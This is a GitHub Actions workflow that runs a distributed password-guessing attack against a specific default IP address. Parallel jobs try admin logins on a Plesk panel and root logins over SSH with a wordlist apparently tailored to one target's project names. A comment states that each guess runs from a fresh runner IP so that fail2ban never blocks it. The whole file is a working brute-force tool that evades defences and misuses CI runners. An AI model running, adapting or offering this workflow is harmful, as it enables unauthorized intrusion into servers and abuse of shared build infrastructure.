name: scan
# One password per runner = one fresh IP per attempt = fail2ban never triggers.
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'target ip'
        default: '74.208.88.23'
      mode:
        description: 'ssh | plesk | both'
        default: 'both'

jobs:
  plesk:
    if: ${{ inputs.mode == 'plesk' || inputs.mode == 'both' }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        pw: ["admin","toor","123456","password","bigbangx","bigbangxadmin","bigbangx123","Bigbangx",
             "cookie","cookie123","cookiechain","cookiescan","cookscan","dosecret","garuda","nexora",
             "dungeon","revan","revan123","rev1853","Zahh","zahhid","risca","riscarevan",
             "Plesk","plesk","Plesk123","plesk123","Plesk2024","Plesk2025","Plesk2026",
             "admin123","Admin123","admin2024","admin2025","admin2026",
             "changeme","secret","letmein","qwerty","qwerty123","Passw0rd","Password1","Password123",
             "server","server123","vps","vps123","host","host123","web","web123","mail","mail123",
             "terra","terra123","luna","luna123","cosmos","atomone","columbus",
             "bigbang","bigbang123","bigbangx2024","bigbangx2025","bigbangx2026",
             "cookieverse","dosecret123","bridge","bridge123","relayer","relayer123","hermes","hermes123",
             "cookscan123","cookiescan123","cookiechain123","dungeon123","garuda123","nexora123",
             "root","Root123","P@ssw0rd","Admin@123","bigbangx!","cookscan!","dosecret!"]
    steps:
      - name: plesk probe ${{ matrix.pw }}
        run: |
          set +e
          T="${{ inputs.target }}"
          rm -f /tmp/cj
          code=$(curl -sk -m 25 -c /tmp/cj -o /tmp/body -w '%{http_code}' \
                 -X POST "https://$T:8443/login_up.php3" \
                 --data-urlencode "login_name=admin" \
                 --data-urlencode "passwd=${{ matrix.pw }}" \
                 --data-urlencode "submit_login=" 2>/dev/null)
          echo "http=$code"
          if [ "$code" = "200" ] || [ "$code" = "302" ]; then
            if grep -qiE 'logout|plesk-session|session_id' /tmp/cj 2>/dev/null; then
              echo "*** PLESK HIT admin:${{ matrix.pw }}"
            else
              echo "    no-session admin:${{ matrix.pw }}"
            fi
          else
            echo "    timeout/err admin:${{ matrix.pw }}"
          fi

  ssh:
    if: ${{ inputs.mode == 'ssh' || inputs.mode == 'both' }}
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        pw: ["root","toor","123456","password","admin","bigbangx","bigbangxadmin","bigbangx123",
             "cookie","cookie123","cookiechain","cookiescan","cookscan","dosecret","garuda","nexora",
             "dungeon","revan","revan123","rev1853","Zahh","risca","riscarevan",
             "Plesk","plesk","Plesk123","plesk123","Plesk2024","Plesk2025","Plesk2026",
             "admin123","Admin123","admin2024","admin2025","admin2026",
             "changeme","secret","letmein","qwerty","qwerty123","Passw0rd","Password1","Password123",
             "server","server123","vps","vps123","host","host123","web","web123","mail","mail123",
             "terra","terra123","luna","luna123","cosmos","atomone","columbus",
             "bigbang","bigbang123","bigbangx2024","bigbangx2025","bigbangx2026",
             "cookieverse","dosecret123","bridge","bridge123","relayer","relayer123","hermes","hermes123"]
    steps:
      - name: ssh probe ${{ matrix.pw }}
        run: |
          set +e
          sudo apt-get update -qq >/dev/null 2>&1
          sudo apt-get install -y -qq sshpass >/dev/null 2>&1
          r=$(timeout 20 sshpass -p "${{ matrix.pw }}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 \
               -o PreferredAuthentications=password -o PubkeyAuthentication=no \
               root@${{ inputs.target }} 'id' 2>&1 | tail -1)
          case "$r" in
            *uid=*) echo "*** SSH HIT root:${{ matrix.pw }} -> $r" ;;
            *) echo "    root:${{ matrix.pw }} -> $r" ;;
          esac
